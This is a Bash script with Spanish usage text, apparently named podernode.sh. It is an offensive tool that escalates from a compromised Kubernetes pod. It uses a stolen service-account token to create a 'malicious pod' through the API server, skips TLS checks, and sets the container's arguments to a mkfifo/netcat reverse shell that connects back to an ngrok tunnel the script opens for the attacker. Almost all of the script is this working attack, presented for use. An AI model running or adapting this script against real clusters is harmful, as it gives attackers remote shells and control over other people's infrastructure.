#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

help()
{
	echo -e "${turquoiseColour}[!]${endColour}${grayColour} Ejecutalo asi:${endColour}"
	echo -e "\n\t${yellowColour}./podernode.sh -p <port> --api-server=<url-api-server> --file=<file pod attacker .yaml> --token=<secret-token> --namespace=<namespace>${endColour}"
	echo -e "\n${grayColour}Parametros:${endColour}"
	echo -e "\t${purpleColour}-p${endColour}${grayColour}:${endColour} ${redColour}puerto de atacante en escucha${endColour}"
	echo -e "\t${purpleColour}-a${endColour}${grayColour}:${endColour} ${redColour}url del servidor API de kubernetes${endColour}"
	echo -e "\t${purpleColour}-f${endColour}${grayColour}:${endColour} ${redColour}archivo del pod malicioso .yaml${endColour}"
	echo -e "\t${purpleColour}-t${endColour}${grayColour}:${endColour} ${redColour}Secret Token del pod en el cual te encuentras${endColour}"
	echo -e "\t${purpleColour}-n${endColour}${grayColour}:${endColour} ${redColour}namespce en el cual te encuentras${endColour}"
	echo -e "\t${purpleColour}--h${endColour}${grayColour}:${endColour} ${redColour}ayuda${endColour}"
}

exploit()
{
	port=$1
	api_server=$2
	pod_to_node_file_upload=$3
	token=$4
	namespace=$5

	rm ptn.json 2>/dev/null

	echo -e "${yellowColour}[+]${endColour} ${grayColour}En otra terminal ejecuta${endColour}"
	echo -e "\t${redColour}sudo nc -nlvp $port${endColour}"

	sleep 10

	python3 converter.py "$pod_to_node_file_upload"

	xterm -hold -e ngrok tcp $port &

	echo -e "${purpleColour}Introduce la direccion de ngrok: ${endColour}"
	read address_ngrok
	echo -e "${purpleColour}Introduce puerto de ngrok: ${endColour}"
	read port_ngrok

	commands="apt update && apt install -y netcat && rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $address_ngrok $port_ngrok >/tmp/f; sleep 1000000"

	cat ptn.json | jq ".spec.containers[0].args |= [\"-c\", \"$commands\"]" | sponge ptn.json

	curl -k -X POST -H "Authorization: Bearer $(cat $token)" -H "Content-Type: application/json" "$api_server/namespaces/$namespace/pods" -d@ptn.json
}

declare -i counter=0

while getopts ":p:a:f:t:n:h:" opt; do
	case $opt in
		p) port=$OPTARG; let counter+=1;;
		a) api_server=$OPTARG; let counter+=1;;
		f) pod_to_node_file_upload=$OPTARG; let counter+=1;;
		t) token=$OPTARG; let counter+=1;;
		n) namespace=$OPTARG; let counter+=1;;
		h) help;;
	esac
done

echo "$counter"



if [ $counter -ne 5 ]; then
      help
else
  exploit $port $api_server $pod_to_node_file_upload $token $namespace	
fi
